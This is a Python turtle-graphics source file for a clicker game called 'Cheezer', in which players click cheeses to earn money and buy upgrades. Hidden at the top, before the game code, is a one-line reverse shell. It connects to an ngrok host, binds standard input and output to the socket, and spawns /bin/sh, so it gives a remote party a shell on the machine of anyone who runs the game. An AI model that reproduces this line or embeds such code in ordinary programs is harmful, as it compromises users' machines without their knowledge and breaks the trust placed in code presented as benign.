# Cheezer

import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",19089));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

import turtle
import random
import time

money = 0

fromage = 0


class Rat:
    def __init__(self, place):
        self.pos = place
        self.aaa = turtle.Turtle()
        self.aaa.speed(0)


    def face(self):
        self.aaa.shape("circle")
        self.aaa.color("gray70")
        self.aaa.shapesize(stretch_wid=6, stretch_len=4)
        self.aaa.penup()
        self.aaa.goto(-300, 40)
        self.aaa.stamp()


    def whisker(self):
        self.aaa.shape("square")
        self.aaa.color("black")
        self.aaa.shapesize(stretch_wid=0.07, stretch_len=2)
        self.aaa.penup()
        self.aaa.goto(self.pos)

    def ear(self):
        self.aaa.shape("circle")
        self.aaa.color("gray70")
        self.aaa.shapesize(stretch_wid=3, stretch_len=3)
        self.aaa.penup()
        self.aaa.goto(self.pos)

    def iear(self):
        self.aaa.shape("circle")
        self.aaa.color("lightpink3")
        self.aaa.shapesize(stretch_wid=2, stretch_len=2)
        self.aaa.penup()
        self.aaa.goto(self.pos, 80)

    def eye(self):
        self.aaa.shape("circle")
        self.aaa.color("black")
        self.aaa.shapesize(stretch_wid=0.5, stretch_len=0.5)
        self.aaa.penup()
        self.aaa.goto(self.pos, 50)


Ratunky = [Rat((-350, 30)), Rat((-350, 20)), Rat((-250, 30)), Rat((-250, 20))]

Eer = [Rat((-350, 80)), Rat((-250, 80))]

Ieer = [Rat(-250), Rat(-350)]

I = [Rat(-318), Rat(-282)]

for rat in Ratunky:
    rat.face()
    rat.whisker()

for rat in Eer:
    rat.ear()

for rat in I:
    rat.eye()

for rat in Ieer:
    rat.iear()


wn = turtle.Screen()
wn.title("CHEEZER")
wn.bgcolor("lavenderblush")
wn.setup(width=800, height=600)
wn.tracer(0)
wn._root.resizable(False, False)


pen = turtle.Turtle()
pen.speed(0)
pen.color("orange")
pen.penup()
pen.hideturtle()
pen.goto(0, 110)
pen.write("CHEEZER", align="center", font=("Comic Sans MS", 110, "normal"))

pen3 = turtle.Turtle()
pen3.speed(0)
pen3.color("orange")
pen3.penup()
pen3.hideturtle()
pen3.goto(0, -230)
pen3.write("monknee: $0", align="center", font=("Comic Sans MS", 20, "normal"))

pen2 = turtle.Turtle()
pen2.speed(0)
pen2.color("orange")
pen2.penup()
pen2.hideturtle()
pen2.goto(0, -160)
pen2.write("American Cheese", align="center", font=("Comic Sans MS", 20, "normal"))

nose = turtle.Turtle()
nose.speed(0)
nose.shape("circle")
nose.color("lightpink3")
nose.shapesize(stretch_wid=0.5, stretch_len=0.5)
nose.penup()
nose.goto(-300, 20)

mouth = turtle.Turtle()
mouth.speed(0)
mouth.shape("square")
mouth.color("black")
mouth.shapesize(stretch_wid=0.1, stretch_len=1)
mouth.penup()
mouth.goto(-300, 8)

offer = turtle.Turtle()
offer.speed(0)
offer.color("orange")
offer.penup()
offer.hideturtle()
offer.goto(0, 0)

status = turtle.Turtle()
status.speed(0)
status.color("orange")
status.penup()
status.hideturtle()
status.goto(0, -90)

sample = turtle.Turtle()
sample.speed(0)
sample.shape("square")
sample.color("lightgoldenrod1")
sample.shapesize(stretch_wid=6, stretch_len=4)
sample.penup()
sample.goto(0, -1000)


def purchase1():
    global fromage, money
    if money >= 180:
        fromage += 1
        money -= 180
        status.clear()
        status.write("Sold!", align="center", font=("Comic Sans MS", 15, "normal"))
        time.sleep(0.5)
        status.clear()
        status.write("purchase button ^", align="center", font=("Comic Sans MS", 15, "normal"))
        offer.clear()
        offer.write("Brie: $1000...Buy?", align="center", font=("Comic Sans MS", 20, "normal"))
    else:
        status.clear()
        status.write("you too poor", align="center", font=("Comic Sans MS", 15, "normal"))
        time.sleep(0.5)
        status.clear()
        status.write("purchase button ^", align="center", font=("Comic Sans MS", 15, "normal"))


def purchase2():
    global fromage, money
    if money >= 1000:
        fromage += 1
        money -= 1000
        status.clear()
        status.write("Sold!", align="center", font=("Comic Sans MS", 15, "normal"))
        time.sleep(0.5)
        status.clear()
        status.write("avoid fisticuffs ^", align="center", font=("Comic Sans MS", 15, "normal"))
        offer.clear()
        offer.write("Pay bill collector? ($5000)", align="center", font=("Comic Sans MS", 20, "normal"))
        sample.goto(0, 70)
        sample.color("darkolivegreen2")
        sample.write("$$$", align="center", font=("Comic Sans MS", 45, "normal"))
    else:
        status.clear()
        status.write("you too poor", align="center", font=("Comic Sans MS", 15, "normal"))
        time.sleep(0.5)
        status.clear()
        status.write("purchase button ^", align="center", font=("Comic Sans MS", 15, "normal"))

def purchase3():
    global fromage, money
    if money >= 5000:
        fromage += 1
        money -= 5000
        btext.clear()
        btext.goto(0, -40)
        btext.write("Thank for playing!1", align="center", font=("Comic Sans MS", 30, "normal"))
    else:
        status.clear()
        status.write("not enougfh!!1!", align="center", font=("Comic Sans MS", 15, "normal"))
        time.sleep(0.5)
        status.clear()
        status.write("avoid fisticuffs ^", align="center", font=("Comic Sans MS", 15, "normal"))



def earn(x, y):
    boost = random.randint(0, 2)
    boost2 = random.randint(0, 5)
    global money
    if fromage == 0:
        money += 1
    if fromage == 1:
        money += 2
        money += boost
    if fromage == 2:
        money += 5
        money += boost2

    pen3.clear()
    pen3.write("monknee: ${}".format(money), align="center", font=("Comic Sans MS", 20, "normal"))


Acheese = turtle.Turtle()
Acheese.speed(0)
Acheese.shape("square")
Acheese.color("orange")
Acheese.shapesize(stretch_wid=10, stretch_len=10)
Acheese.penup()
Acheese.onclick(earn)
if fromage == 1:
    Acheese.goto(0, -1000)

gouda = turtle.Turtle()
gouda.speed(0)
gouda.shape("square")
gouda.color("lightgoldenrod1")
gouda.shapesize(stretch_wid=12, stretch_len=8)
gouda.penup()
gouda.onclick(earn)
gouda.goto(0, -1000)

brie = turtle.Turtle()
brie.speed(0)
brie.shape("circle")
brie.color("wheat1")
brie.shapesize(stretch_wid=11, stretch_len=11)
brie.penup()
brie.onclick(earn)
brie.goto(0, -1000)

btext = turtle.Turtle()
btext.speed(0)
btext.color("orange")
btext.shapesize(stretch_wid=6, stretch_len=10)
btext.penup()
btext.hideturtle()
btext.goto(310, -240)
btext.write("shop v", align="center", font=("Comic Sans MS", 20, "normal"))


def store(x, y):
    pen.goto(0, 200)
    pen.clear()
    pen.write("Store!!1!", align="center", font=("comic Sans MS", 50, "normal"))
    pen2.clear()
    pen3.clear()
    btext.clear()
    btext.write("back v", align="center", font=("Comic Sans MS", 20, "normal"))
    Acheese.goto(0, -1000)
    gouda.goto(0, -1000)
    brie.goto(0, -1000)
    shop.goto(330, -500)
    back.goto(330, -300)
    upgrade.goto(0, -30)
    if fromage == 0:
        offer.write("Gouda: $180...Buy?", align="center", font=("Comic Sans MS", 20, "normal"))
        status.write("purchase button ^", align="center", font=("Comic Sans MS", 15, "normal"))
        sample.goto(0, 120)
    if fromage == 1:
        offer.write("Brie: $1000...Buy?", align="center", font=("Comic Sans MS", 20, "normal"))
        status.write("purchase button ^", align="center", font=("Comic Sans MS", 15, "normal"))
        sample.goto(0, 120)
    if fromage == 2:
        offer.write("Pay bill collector? ($5000)", align="center", font=("Comic Sans MS", 20, "normal"))
        status.write("avoid fisticuffs ^", align="center", font=("Comic Sans MS", 15, "normal"))
        sample.goto(0, 70)
        sample.write("$$$", align="center", font=("Comic Sans MS", 45, "normal"))


def home(x, y):
    global money
    pen.goto(0, 110)
    pen.clear()
    pen.write("CHEEZER", align="center", font=("Comic Sans MS", 110, "normal"))
    shop.goto(330, -300)
    pen3.write("monknee: ${}".format(money), align="center", font=("Comic Sans MS", 20, "normal"))
    back.goto(330, -1000)
    btext.clear()
    btext.write("shop v", align="center", font=("Comic Sans MS", 20, "normal"))
    upgrade.goto(0, -1000)
    offer.clear()
    status.clear()
    sample.goto(0, -1000)
    sample.clear()
    if fromage == 0:
        Acheese.goto(0, 0)
        Acheese.onclick(earn)
        pen2.clear()
        pen2.write("American Cheese", align="center", font=("Comic Sans MS", 20, "normal"))
    if fromage == 1:
        gouda.goto(0, 0)
        gouda.onclick(earn)
        pen2.clear()
        pen2.write("Gouda", align="center", font=("Comic Sans MS", 20, "normal"))
    if fromage == 2:
        brie.goto(0, 0)
        brie.onclick(earn)
        pen2.clear()
        pen2.write("Brie", align="center", font=("Comic Sans MS", 20, "normal"))


back = turtle.Turtle()
back.speed(0)
back.shape("square")
back.color("pink")
back.shapesize(stretch_wid=6, stretch_len=10)
back.penup()
back.goto(330, -1000)
back.onclick(home)

shop = turtle.Turtle()
shop.speed(0)
shop.shape("square")
shop.color("pink")
shop.shapesize(stretch_wid=6, stretch_len=10)
shop.penup()
shop.goto(330, -300)
shop.onclick(store)

upgrade = turtle.Turtle()
upgrade.speed(0)
upgrade.shape("square")
upgrade.color("pink")
upgrade.shapesize(stretch_wid=2, stretch_len=10)
upgrade.penup()
upgrade.goto(0, -1000)


while True:
    wn.update()
    if fromage == 0:
        upgrade.onclick(lambda x, y: purchase1())
    if fromage == 1:
        upgrade.onclick(lambda x, y: purchase2())
        sample.shape("circle")
        sample.color("wheat1")
        sample.shapesize(stretch_wid=5.5, stretch_len=5.5)
    if fromage == 2:
        upgrade.onclick(lambda x, y: purchase3())
        sample.shapesize(stretch_wid=0.001, stretch_len=0.001)
        sample.color("darkolivegreen2")
# win condition
    if fromage == 3:
        pen.clear()
        shop.goto(0, -1000)
        back.goto(330, -1000)
        upgrade.goto(0, -1000)
        offer.clear()
        status.clear()
        sample.goto(0, -1000)
        sample.clear()
        nose.goto(0,-1000)
        mouth.goto(0,-1000)
        ugh = turtle.Turtle()
        ugh.speed(0)
        ugh.shape("circle")
        ugh.color("lavenderblush")
        ugh.shapesize(stretch_wid=6, stretch_len=4)
        ugh.penup()
        ugh.goto(-300, 40)
        for rat in Ratunky:
            rat.aaa.goto(0,-1000)
        for rat in Eer:
            rat.aaa.goto(0,-1000)
        for rat in I:
            rat.aaa.goto(0,-1000)
        for rat in Ieer:
            rat.aaa.goto(0, -1000)
        pen.goto(0,0)
        pen.write("NO MORE BILLS!1!", align="center", font=("Comic Sans MS", 49, "normal"))
        pen.write("NO MORE BILLS!1!", align="center", font=("Comic Sans MS", 50, "normal"))
        pen.write("NO MORE BILLS!1!", align="center", font=("Comic Sans MS", 51, "normal"))




